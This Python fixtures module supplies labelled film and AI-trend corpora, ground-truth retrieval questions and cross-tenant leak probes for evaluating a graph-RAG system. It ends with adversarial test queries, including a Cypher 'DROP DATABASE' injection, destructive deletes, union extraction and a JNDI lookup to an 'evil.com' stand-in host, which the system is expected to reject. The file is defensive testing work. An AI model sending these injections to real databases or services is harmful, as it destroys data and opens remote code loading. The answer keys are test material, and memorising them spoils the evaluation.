"""Labelled evaluation corpora and ground-truth question sets.

Two tenants with deliberately disjoint domains, so any cross-tenant retrieval is
unambiguous evidence of a leak rather than a coincidental vocabulary overlap.

Each question carries the entity ids a correct answer must surface, which is what
makes Recall@k / MRR / nDCG computable. `requires_multi_hop=True` marks the
questions that vector-only retrieval is expected to fail — those are the ones that
justify the graph half of the system.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Dict, List, Literal


@dataclass(frozen=True)
class LabelledQuestion:
    """A question with the ground truth needed to score a retrieval run."""

    question: str
    # Canonical entity ids that must appear in the returned subgraph.
    expected_entities: List[str]
    # Substrings that must appear somewhere in the returned passages.
    expected_text: List[str] = field(default_factory=list)
    requires_multi_hop: bool = False
    hops: int = 1
    category: Literal[
        "single_hop", "multi_hop", "aggregation", "negative", "adversarial", "edge_case"
    ] = "single_hop"
    note: str = ""


@dataclass(frozen=True)
class TenantFixture:
    """Everything needed to provision, ingest, and evaluate one tenant."""

    tenant_id: str
    documents: Dict[str, str]
    questions: List[LabelledQuestion]
    # Entity ids that exist ONLY here. Used as cross-tenant leak probes.
    exclusive_entities: List[str]
    # Distinctive phrases that must never appear in another tenant's results.
    exclusive_phrases: List[str]


# ===================================================================== MOVIES

MOVIES_DOCS: Dict[str, str] = {
    "doc_nolan": """# Christopher Nolan

Christopher Nolan directed Inception. Christopher Nolan directed Interstellar.
Christopher Nolan directed Dunkirk. Christopher Nolan directed Oppenheimer.

## Inception

Inception was released in 2010. Leonardo DiCaprio starred in Inception.
Hans Zimmer composed the score for Inception. Warner Bros produced Inception.
Inception has genre Science Fiction.

## Interstellar

Interstellar was released in 2014. Matthew McConaughey starred in Interstellar.
Hans Zimmer composed the score for Interstellar. Interstellar has genre Science Fiction.

## Dunkirk

Dunkirk was released in 2017. Dunkirk has genre War. Warner Bros produced Dunkirk.
""",
    "doc_scorsese": """# Martin Scorsese

Martin Scorsese directed The Departed. Martin Scorsese directed Shutter Island.

## The Departed

The Departed was released in 2006. Leonardo DiCaprio starred in The Departed.
The Departed has genre Crime. Warner Bros produced The Departed.

## Shutter Island

Shutter Island was released in 2010. Leonardo DiCaprio starred in Shutter Island.
Shutter Island has genre Thriller.
""",
    "doc_villeneuve": """# Denis Villeneuve

Denis Villeneuve directed Dune. Denis Villeneuve directed Arrival.

## Dune

Dune was released in 2021. Hans Zimmer composed the score for Dune.
Dune has genre Science Fiction. Legendary Pictures produced Dune.

## Arrival

Arrival was released in 2016. Arrival has genre Science Fiction.
""",
}

MOVIES_QUESTIONS: List[LabelledQuestion] = [
    # ---------------------------------------------------------- single hop
    LabelledQuestion(
        question="Who directed Inception?",
        expected_entities=["canon_person_christopher_nolan", "canon_film_inception"],
        expected_text=["Christopher Nolan", "Inception"],
        category="single_hop",
    ),
    LabelledQuestion(
        question="When was Interstellar released?",
        expected_entities=["canon_film_interstellar"],
        expected_text=["Interstellar", "2014"],
        category="single_hop",
    ),
    LabelledQuestion(
        question="Who starred in The Departed?",
        expected_entities=["canon_person_leonardo_dicaprio", "canon_film_the_departed"],
        expected_text=["Leonardo DiCaprio"],
        category="single_hop",
    ),
    # ---------------------------------------------------------- multi hop
    LabelledQuestion(
        question="Which other films did the director of Inception make?",
        expected_entities=[
            "canon_person_christopher_nolan",
            "canon_film_interstellar",
            "canon_film_dunkirk",
        ],
        expected_text=["Christopher Nolan", "Interstellar"],
        requires_multi_hop=True,
        hops=2,
        category="multi_hop",
        note="Inception -> Nolan -> {Interstellar, Dunkirk}. No single chunk states this.",
    ),
    LabelledQuestion(
        question="Which composer worked on both Inception and Dune?",
        expected_entities=["canon_person_hans_zimmer", "canon_film_inception", "canon_film_dune"],
        expected_text=["Hans Zimmer"],
        requires_multi_hop=True,
        hops=2,
        category="multi_hop",
        note="Spans two documents; requires joining on a shared entity.",
    ),
    LabelledQuestion(
        question="What other films did the star of Shutter Island appear in?",
        expected_entities=[
            "canon_person_leonardo_dicaprio",
            "canon_film_inception",
            "canon_film_the_departed",
        ],
        expected_text=["Leonardo DiCaprio"],
        requires_multi_hop=True,
        hops=2,
        category="multi_hop",
    ),
    LabelledQuestion(
        question="Which studio produced films directed by Christopher Nolan?",
        expected_entities=["canon_studio_warner_bros", "canon_person_christopher_nolan"],
        expected_text=["Warner Bros"],
        requires_multi_hop=True,
        hops=2,
        category="multi_hop",
    ),
    # ---------------------------------------------------------- aggregation
    LabelledQuestion(
        question="Which science fiction films are in the knowledge base?",
        expected_entities=["canon_genre_science_fiction"],
        expected_text=["Science Fiction"],
        hops=1,
        category="aggregation",
    ),
    # ---------------------------------------------------------- edge cases
    LabelledQuestion(
        question="inception director",
        expected_entities=["canon_film_inception", "canon_person_christopher_nolan"],
        expected_text=["Christopher Nolan"],
        category="edge_case",
        note="Lowercase, no punctuation, keyword-style. Tests the mention fallback path.",
    ),
    LabelledQuestion(
        question="Tell me about Dune",
        expected_entities=["canon_film_dune"],
        expected_text=["Dune"],
        category="edge_case",
        note="Leading imperative must be stripped without losing the entity.",
    ),
    LabelledQuestion(
        question="Who directed Incepton?",
        expected_entities=["canon_film_inception"],
        expected_text=["Inception"],
        category="edge_case",
        note="Misspelling. Jaro-Winkler should still link above threshold.",
    ),
    # ---------------------------------------------------------- negative
    LabelledQuestion(
        question="Who directed The Godfather?",
        expected_entities=[],
        expected_text=[],
        category="negative",
        note="Not in the corpus. Must not fabricate; fallback is acceptable, "
             "invented entities are not.",
    ),
    LabelledQuestion(
        question="What is a transformer architecture?",
        expected_entities=[],
        expected_text=[],
        category="negative",
        note="Belongs to the other tenant. Must return nothing from ai_trends.",
    ),
]

MOVIES_FIXTURE = TenantFixture(
    tenant_id="movies_bot",
    documents=MOVIES_DOCS,
    questions=MOVIES_QUESTIONS,
    exclusive_entities=[
        "canon_film_inception",
        "canon_person_christopher_nolan",
        "canon_film_dunkirk",
        "canon_person_leonardo_dicaprio",
    ],
    exclusive_phrases=["Inception", "Christopher Nolan", "Leonardo DiCaprio", "Dunkirk"],
)


# =================================================================== AI TRENDS

AI_TRENDS_DOCS: Dict[str, str] = {
    "doc_transformers": """# Transformer Architecture

The Transformer was released by Google. The Transformer uses Self Attention.
BERT builds on the Transformer. BERT was released by Google.
BERT was trained on Wikipedia.

## GPT Family

GPT-3 builds on the Transformer. GPT-3 was released by OpenAI.
GPT-4 supersedes GPT-3. GPT-4 was released by OpenAI.
GPT-4 outperforms GPT-3 on MMLU.
""",
    "doc_diffusion": """# Diffusion Models

Stable Diffusion uses Latent Diffusion. Stable Diffusion was released by Stability AI.
Latent Diffusion builds on Denoising Diffusion.
DALL-E 2 uses Denoising Diffusion. DALL-E 2 was released by OpenAI.

## Training

Stable Diffusion was trained on LAION. Stable Diffusion runs on A100.
""",
    "doc_retrieval": """# Retrieval Augmented Generation

RAG uses Dense Retrieval. RAG was released by Meta.
Graph RAG builds on RAG. Graph RAG uses Knowledge Graphs.
Dense Retrieval uses Embeddings. HNSW uses Approximate Nearest Neighbor.
Graph RAG outperforms RAG on multi-hop questions.
""",
}

AI_TRENDS_QUESTIONS: List[LabelledQuestion] = [
    # ---------------------------------------------------------- single hop
    LabelledQuestion(
        question="Who released GPT-4?",
        expected_entities=["canon_model_gpt_4", "canon_organization_openai"],
        expected_text=["OpenAI", "GPT-4"],
        category="single_hop",
    ),
    LabelledQuestion(
        question="What technique does Stable Diffusion use?",
        expected_entities=["canon_model_stable_diffusion", "canon_technique_latent_diffusion"],
        expected_text=["Latent Diffusion"],
        category="single_hop",
    ),
    # ---------------------------------------------------------- multi hop
    LabelledQuestion(
        question="Which models build on the Transformer?",
        expected_entities=[
            "canon_technique_transformer",
            "canon_model_bert",
            "canon_model_gpt_3",
        ],
        expected_text=["Transformer"],
        requires_multi_hop=True,
        hops=2,
        category="multi_hop",
    ),
    LabelledQuestion(
        question="What did the organization behind GPT-4 also release?",
        expected_entities=["canon_organization_openai", "canon_model_dall_e_2"],
        expected_text=["OpenAI"],
        requires_multi_hop=True,
        hops=2,
        category="multi_hop",
        note="GPT-4 -> OpenAI -> DALL-E 2. Classic two-hop.",
    ),
    LabelledQuestion(
        question="Which technique does the model that supersedes GPT-3 rely on?",
        expected_entities=["canon_model_gpt_4", "canon_model_gpt_3", "canon_technique_transformer"],
        expected_text=["GPT-4"],
        requires_multi_hop=True,
        hops=3,
        category="multi_hop",
        note="Three hops. Tests the depth<=3 bound.",
    ),
    LabelledQuestion(
        question="What does Graph RAG build on and what does it use?",
        expected_entities=[
            "canon_technique_graph_rag",
            "canon_technique_rag",
            "canon_technique_knowledge_graphs",
        ],
        expected_text=["Graph RAG"],
        requires_multi_hop=True,
        hops=2,
        category="multi_hop",
    ),
    # ---------------------------------------------------------- edge cases
    LabelledQuestion(
        question="gpt-4",
        expected_entities=["canon_model_gpt_4"],
        expected_text=["GPT-4"],
        category="edge_case",
        note="Bare entity, lowercase, hyphenated. Tests normalization.",
    ),
    LabelledQuestion(
        question="What is HNSW?",
        expected_entities=["canon_technique_hnsw"],
        expected_text=["HNSW"],
        category="edge_case",
        note="Acronym; must not be lowercased into oblivion.",
    ),
    # ---------------------------------------------------------- negative
    LabelledQuestion(
        question="Who directed Inception?",
        expected_entities=[],
        expected_text=[],
        category="negative",
        note="Belongs to the movies tenant. Must return nothing here.",
    ),
]

AI_TRENDS_FIXTURE = TenantFixture(
    tenant_id="ai_trends_bot",
    documents=AI_TRENDS_DOCS,
    questions=AI_TRENDS_QUESTIONS,
    exclusive_entities=[
        "canon_model_gpt_4",
        "canon_technique_transformer",
        "canon_model_stable_diffusion",
        "canon_organization_openai",
    ],
    exclusive_phrases=["GPT-4", "Transformer", "Stable Diffusion", "Latent Diffusion"],
)


# =================================================================== ADVERSARIAL

@dataclass(frozen=True)
class AdversarialCase:
    """A hostile input with the response we require."""

    name: str
    query: str
    expect_status: int
    description: str


ADVERSARIAL_QUERIES: List[AdversarialCase] = [
    AdversarialCase(
        "cypher_drop", "Inception'; DROP DATABASE tenant_movies_bot_kb; --",
        400, "Statement chaining with database destruction",
    ),
    AdversarialCase(
        "cypher_detach_delete", "Nolan DETACH DELETE n",
        400, "Destructive delete verb",
    ),
    AdversarialCase(
        "cypher_union", "Inception UNION ALL MATCH (n) RETURN n",
        400, "Union-based extraction attempt",
    ),
    AdversarialCase(
        "procedure_call", "Inception CALL dbms.components()",
        400, "Procedure invocation",
    ),
    AdversarialCase(
        "comment_injection", "Inception /* comment */ RETURN 1",
        400, "Block comment injection",
    ),
    AdversarialCase(
        "template_injection", "Inception ${jndi:ldap://evil.com/a}",
        400, "Template interpolation",
    ),
    AdversarialCase(
        "null_byte", "Inception\x00malicious",
        400, "Null byte injection",
    ),
    AdversarialCase(
        "oversized_query", "A" * 3000,
        400, "Query exceeding the 2000-character bound",
    ),
]


ALL_FIXTURES: List[TenantFixture] = [MOVIES_FIXTURE, AI_TRENDS_FIXTURE]
